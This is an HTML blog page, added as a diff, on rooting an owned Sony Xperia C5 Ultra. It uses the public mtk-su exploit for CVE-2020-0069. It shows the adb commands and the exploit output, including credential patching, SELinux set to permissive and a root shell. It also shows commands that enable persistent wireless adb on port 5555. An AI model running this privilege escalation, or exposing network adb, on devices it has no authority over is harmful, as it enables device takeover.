@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  
+  
+  <link rel="stylesheet" href="https://kleo.hak.dog/css/reset.css"/>
+  <link rel="stylesheet" href="https://kleo.hak.dog/css/index.css"/>
+  
+
+  <title>∅</title>
+</head>
+
+<body>
+  <section class="section">
+    <div class="container">
+      
+
+<table class="header">
+  <tr>
+    <td colspan="2" rowspan="2" class="width-auto">
+      <h1 class="title">Sony Xperia C5 Ultra bootless root</h1>
+      <span class="subtitle"></span>
+    </td>
+    <th>Version</th>
+    <td class="width-min">v0.1</td>
+  </tr>
+  <tr>
+    <th>Updated</th>
+    <td class="width-min"><time style="white-space: pre;">2021-06-11</time></td>
+  </tr>
+  <tr>
+    <th class="width-min">Author</th>
+    <td class="width-auto"><cite><a href=https:&#x2F;&#x2F;kleo.hak.dog>kleo</a></cite></a></td>
+    <th class="width-min">License</th>
+    <td>MIT</td>
+  </tr>
+</table>
+<label class="debug-toggle-label"><input type="checkbox" class="debug-toggle" /> Debug mode</label>
+<div class="debug-grid"></div>
+
+<!-- <div class="abstract">
+<div class="abstract-title">$abstract-title$</div>
+$abstract$
+</div> -->
+
+
+
+<p>google "latest rooting methods github android" at around 6 in the morning</p>
+<p>2nd result <a href="https://github.com/JunioJsv/mtk-easy-su">JunioJsv/mtk-easy-su</a></p>
+<p>Now I have found out that my old phone is vulnerable to CVE-2020-0069 discovered by Diplomatic from XDA<sup class="footnote-reference"><a href="#1">1</a></sup> <sup class="footnote-reference"><a href="#2">2</a></sup></p>
+<p>Check Sony Xperia C5 Ultra specs<sup class="footnote-reference"><a href="#3">3</a></sup></p>
+<p>Chipset Mediatek MT6752 (28 nm) matches with mtk-su compatible chipsets</p>
+<hr />
+<p>Running mtk-su</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>adb push arm64/mtk-su /data/local/tmp
+</span><span>adb shell
+</span><span>cd /data/local/tmp
+</span><span>shell@E5553:/data/local/tmp $ chmod 755 mtk-su
+</span><span>arm64/mtk-su: 1 file pushed, 0 skipped. 175.9 MB/s (65144 bytes in 0.000s)
+</span><span>
+</span><span>shell@E5553:/data/local/tmp $ ./mtk-su -v                                      
+</span><span>param1: 0x3000, param2: 0x18040, type: 7
+</span><span>Building symbol table
+</span><span>kallsyms_addresses pa 0x40b98500
+</span><span>kallsyms_num_syms 77053, addr_count 77053
+</span><span>kallsyms_names pa 0x40c2ee00, size 941657
+</span><span>kallsyms_markers pa 0x40d14d00
+</span><span>kallsyms_token_table pa 0x40d15700
+</span><span>kallsyms_token_index pa 0x40d15b00
+</span><span>Patching credentials
+</span><span>Parsing current_is_single_threaded
+</span><span>ffffffc000318ee8+50: ADRP x0, 0xffffffc000fd8000
+</span><span>ffffffc000318ee8+54: ADD Rd, x0, 0x7d0
+</span><span>Possible list_head tasks at offset 0x278
+</span><span>comm swapper/0 at offset 0x4f8
+</span><span>Found own task_struct at node 4
+</span><span>cred VA: 0xffffffc063074300
+</span><span>init_task VA: 0xffffffc000fd87d0
+</span><span>Parsing avc_denied
+</span><span>ffffffc0002c63ac+20: ADRP x0, 0xffffffc001180000
+</span><span>ffffffc0002c63ac+24: LDR [x0, 0x964]
+</span><span>selinux_enforcing VA: 0xffffffc001180964
+</span><span>Setting selinux_enforcing
+</span><span>Switched selinux to permissive
+</span><span>starting /system/bin/sh
+</span><span>UID: 0  cap: 3fffffffff  selinux: permissive  
+</span><span>shell@E5553:/data/local/tmp # whoami
+</span><span>root
+</span></code></pre>
+<hr />
+<p>Install mtk-easy-su apk</p>
+<p><img src="https://kleo.hak.dog/sony-xperia-c5-ultra-bootless-root/1.png" alt="" /></p>
+<p>Follow bootless root for Magisk 20+!<sup class="footnote-reference"><a href="#4">4</a></sup></p>
+<hr />
+<p>Wireless adb is not available on android 6.0 developer settings, following this to enable it<sup class="footnote-reference"><a href="#5">5</a></sup></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>su
+</span><span>setprop service.adb.tcp.port 5555
+</span><span>stop adbd
+</span><span>start adbd
+</span></code></pre>
+<p>Next is to enable adb wireless on boot<sup class="footnote-reference"><a href="#6">6</a></sup></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>setprop persist.adb.tcp.port 5555
+</span></code></pre>
+<p>Removal</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>setprop persist.adb.tcp.port &quot;&quot;
+</span></code></pre>
+<hr />
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p><a href="https://forum.xda-developers.com/t/amazing-temp-root-for-mediatek-armv8-2020-08-24.3922213/">Amazing Temp Root for MediaTek ARMv8 2020-08-24</a></p>
+</div>
+<div class="footnote-definition" id="2"><sup class="footnote-definition-label">2</sup>
+<p><a href="https://www.xda-developers.com/mediatek-su-rootkit-exploit/">Critical MediaTek rootkit affecting millions of Android devices has been out in the open for months</a></p>
+</div>
+<div class="footnote-definition" id="3"><sup class="footnote-definition-label">3</sup>
+<p><a href="https://www.gsmarena.com/sony_xperia_c5_ultra-7463.php">GSM Arena Sony Xperia C5 Ultra</a></p>
+</div>
+<div class="footnote-definition" id="4"><sup class="footnote-definition-label">4</sup>
+<p><a href="https://forum.xda-developers.com/t/amazing-temp-root-for-mediatek-armv8-2020-08-24.3922213/post-82081703">Up-to-date bootless root for Magisk 20+!</a></p>
+</div>
+<div class="footnote-definition" id="5"><sup class="footnote-definition-label">5</sup>
+<p><a href="https://stackoverflow.com/a/31327918/10025507">Enable wireless adb as root</a></p>
+</div>
+<div class="footnote-definition" id="6"><sup class="footnote-definition-label">6</sup>
+<p><a href="https://stackoverflow.com/a/34219466/10025507">Enable wireless adb on boot</a></p>
+</div>
+
+
+    </div>
+  </section>
+
+  <script src="https://kleo.hak.dog/js/index.js"></script> 
+</body>
+
+</html>
+
